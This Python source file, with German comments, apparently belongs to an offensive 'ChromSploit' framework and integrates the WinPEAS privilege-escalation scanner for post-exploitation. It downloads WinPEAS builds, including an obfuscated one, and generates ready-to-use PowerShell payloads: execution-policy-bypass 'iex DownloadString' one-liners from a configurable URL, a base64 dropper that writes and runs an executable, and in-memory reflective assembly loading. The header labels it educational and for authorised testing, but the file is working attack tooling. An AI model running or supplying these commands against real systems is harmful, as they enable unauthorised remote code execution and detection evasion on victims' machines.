#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
WinPEAS Integration für Post-Exploitation
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import base64
import requests
import subprocess
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class WinPEASIntegration:
    """
    Integration von WinPEAS für Post-Exploitation in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die WinPEAS-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.winpeas_dir = os.path.join(PathUtils.get_data_dir(), "winpeas")
        self.winpeas_exe_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
        self.winpeas_bat_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat"
        self.winpeas_obfuscated_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
        
        # Lokale Pfade
        self.winpeas_exe_path = os.path.join(self.winpeas_dir, "winPEASany.exe")
        self.winpeas_bat_path = os.path.join(self.winpeas_dir, "winPEAS.bat")
        self.winpeas_obfuscated_path = os.path.join(self.winpeas_dir, "winPEASany_ofs.exe")
        
        # Sicherstellen, dass das Verzeichnis existiert
        PathUtils.ensure_dir_exists(self.winpeas_dir)
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob WinPEAS verfügbar ist
        
        Returns:
            bool: True, wenn WinPEAS verfügbar ist, sonst False
        """
        return os.path.exists(self.winpeas_exe_path) or os.path.exists(self.winpeas_bat_path)
    
    def download_winpeas(self, force: bool = False) -> bool:
        """
        Lädt die neueste Version von WinPEAS herunter
        
        Args:
            force (bool, optional): Ob bestehende Dateien überschrieben werden sollen
            
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available() and not force:
            self.log("info", "WinPEAS ist bereits verfügbar")
            return True
        
        self.log("info", "Lade WinPEAS herunter...")
        
        success = True
        
        try:
            # WinPEAS.exe herunterladen
            self.log("info", "Lade WinPEASany.exe herunter...")
            response = requests.get(self.winpeas_exe_url, timeout=30)
            
            if response.status_code == 200:
                with open(self.winpeas_exe_path, "wb") as f:
                    f.write(response.content)
                self.log("info", f"WinPEASany.exe erfolgreich heruntergeladen: {self.winpeas_exe_path}")
            else:
                self.log("error", f"Fehler beim Herunterladen von WinPEASany.exe: Status {response.status_code}")
                success = False
            
            # WinPEAS.bat herunterladen
            self.log("info", "Lade WinPEAS.bat herunter...")
            response = requests.get(self.winpeas_bat_url, timeout=30)
            
            if response.status_code == 200:
                with open(self.winpeas_bat_path, "wb") as f:
                    f.write(response.content)
                self.log("info", f"WinPEAS.bat erfolgreich heruntergeladen: {self.winpeas_bat_path}")
            else:
                self.log("error", f"Fehler beim Herunterladen von WinPEAS.bat: Status {response.status_code}")
                success = False
            
            # Obfuscated WinPEAS herunterladen
            self.log("info", "Lade obfuscated WinPEASany.exe herunter...")
            response = requests.get(self.winpeas_obfuscated_url, timeout=30)
            
            if response.status_code == 200:
                with open(self.winpeas_obfuscated_path, "wb") as f:
                    f.write(response.content)
                self.log("info", f"Obfuscated WinPEASany.exe erfolgreich heruntergeladen: {self.winpeas_obfuscated_path}")
            else:
                self.log("error", f"Fehler beim Herunterladen von obfuscated WinPEASany.exe: Status {response.status_code}")
                success = False
            
            return success
        except Exception as e:
            self.log("error", f"Fehler beim Herunterladen von WinPEAS: {str(e)}")
            return False
    
    def get_latest_release_info(self) -> Optional[Dict[str, Any]]:
        """
        Ruft Informationen über die neueste WinPEAS-Version ab
        
        Returns:
            dict: Informationen über die neueste Version oder None bei Fehler
        """
        try:
            response = requests.get("https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest", timeout=30)
            
            if response.status_code == 200:
                release_info = response.json()
                
                return {
                    "version": release_info.get("tag_name", "Unbekannt"),
                    "name": release_info.get("name", "Unbekannt"),
                    "published_at": release_info.get("published_at", "Unbekannt"),
                    "html_url": release_info.get("html_url", "Unbekannt"),
                    "assets": [
                        {
                            "name": asset.get("name", ""),
                            "size": asset.get("size", 0),
                            "download_url": asset.get("browser_download_url", "")
                        }
                        for asset in release_info.get("assets", [])
                    ]
                }
            else:
                self.log("error", f"Fehler beim Abrufen der Release-Informationen: Status {response.status_code}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der Release-Informationen: {str(e)}")
            return None
    
    def generate_powershell_oneliner(self, 
                                   obfuscated: bool = False, 
                                   custom_url: Optional[str] = None) -> str:
        """
        Generiert einen PowerShell-Oneliner zum Ausführen von WinPEAS
        
        Args:
            obfuscated (bool, optional): Ob die obfuscated Version verwendet werden soll
            custom_url (str, optional): Benutzerdefinierte URL für WinPEAS
            
        Returns:
            str: PowerShell-Oneliner
        """
        url = custom_url
        
        if not url:
            if obfuscated:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
            else:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
        
        oneliner = f'powershell -ep bypass -c "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex (New-Object System.Net.WebClient).DownloadString(\'{url}\')"'
        
        return oneliner
    
    def generate_powershell_twolines(self, 
                                   obfuscated: bool = False, 
                                   custom_url: Optional[str] = None) -> List[str]:
        """
        Generiert einen zweiteiligen PowerShell-Befehl zum Ausführen von WinPEAS
        
        Args:
            obfuscated (bool, optional): Ob die obfuscated Version verwendet werden soll
            custom_url (str, optional): Benutzerdefinierte URL für WinPEAS
            
        Returns:
            list: Zweiteiliger PowerShell-Befehl
        """
        url = custom_url
        
        if not url:
            if obfuscated:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
            else:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
        
        line1 = f'[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12'
        line2 = f'iex (New-Object System.Net.WebClient).DownloadString(\'{url}\')'
        
        return [line1, line2]
    
    def generate_base64_payload(self, 
                              obfuscated: bool = False, 
                              custom_path: Optional[str] = None) -> str:
        """
        Generiert einen Base64-kodierten WinPEAS-Payload
        
        Args:
            obfuscated (bool, optional): Ob die obfuscated Version verwendet werden soll
            custom_path (str, optional): Benutzerdefinierter Pfad zur WinPEAS-Datei
            
        Returns:
            str: Base64-kodierter Payload
        """
        path = custom_path
        
        if not path:
            if obfuscated:
                path = self.winpeas_obfuscated_path
            else:
                path = self.winpeas_exe_path
        
        if not os.path.exists(path):
            self.log("warning", f"WinPEAS-Datei existiert nicht: {path}")
            self.log("info", "Versuche, WinPEAS herunterzuladen...")
            
            if not self.download_winpeas():
                self.log("error", "Fehler beim Herunterladen von WinPEAS")
                return ""
        
        try:
            with open(path, "rb") as f:
                content = f.read()
                encoded = base64.b64encode(content).decode("utf-8")
                
                # PowerShell-Befehl zum Dekodieren und Ausführen
                powershell_cmd = f'powershell -ep bypass -c "$data = [System.Convert]::FromBase64String(\'{encoded}\'); $tempFile = [System.IO.Path]::GetTempFileName() + \'.exe\'; [System.IO.File]::WriteAllBytes($tempFile, $data); Start-Process -FilePath $tempFile -Wait; Remove-Item -Path $tempFile"'
                
                return powershell_cmd
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Base64-Payloads: {str(e)}")
            return ""
    
    def generate_memory_execution_command(self, 
                                        obfuscated: bool = False, 
                                        custom_url: Optional[str] = None) -> str:
        """
        Generiert einen Befehl zur Ausführung von WinPEAS direkt im Speicher
        
        Args:
            obfuscated (bool, optional): Ob die obfuscated Version verwendet werden soll
            custom_url (str, optional): Benutzerdefinierte URL für WinPEAS
            
        Returns:
            str: Befehl zur Ausführung im Speicher
        """
        url = custom_url
        
        if not url:
            if obfuscated:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
            else:
                url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
        
        # PowerShell-Befehl zum Herunterladen und Ausführen im Speicher
        memory_cmd = f'powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData(\'{url}\'); $assembly = [System.Reflection.Assembly]::Load($data); [winPEAS.Program]::Main()"'
        
        return memory_cmd
    
    def generate_obfuscated_execution_command(self, custom_path: Optional[str] = None) -> str:
        """
        Generiert einen Befehl zur Ausführung der obfuskierten WinPEAS-Version
        
        Args:
            custom_path (str, optional): Benutzerdefinierter Pfad zur obfuskierten WinPEAS-Datei
            
        Returns:
            str: Befehl zur Ausführung der obfuskierten Version
        """
        path = custom_path or self.winpeas_obfuscated_path
        
        if not os.path.exists(path):
            self.log("warning", f"Obfuscated WinPEAS-Datei existiert nicht: {path}")
            self.log("info", "Versuche, obfuscated WinPEAS herunterzuladen...")
            
            if not self.download_winpeas():
                self.log("error", "Fehler beim Herunterladen von obfuscated WinPEAS")
                return ""
        
        # PowerShell-Befehl zum Ausführen der obfuskierten Version
        obfuscated_cmd = f'powershell -ep bypass -c "Start-Process -FilePath \'{path}\' -Wait"'
        
        return obfuscated_cmd
    
    def get_all_commands(self) -> Dict[str, str]:
        """
        Gibt alle verfügbaren WinPEAS-Befehle zurück
        
        Returns:
            dict: Dictionary mit allen Befehlen
        """
        commands = {
            "latest_release": "Neueste Version herunterladen",
            "powershell_oneliner": self.generate_powershell_oneliner(),
            "powershell_twolines": "\n".join(self.generate_powershell_twolines()),
            "base64_payload": self.generate_base64_payload(),
            "memory_execution": self.generate_memory_execution_command(),
            "obfuscated_execution": self.generate_obfuscated_execution_command()
        }
        
        return commands
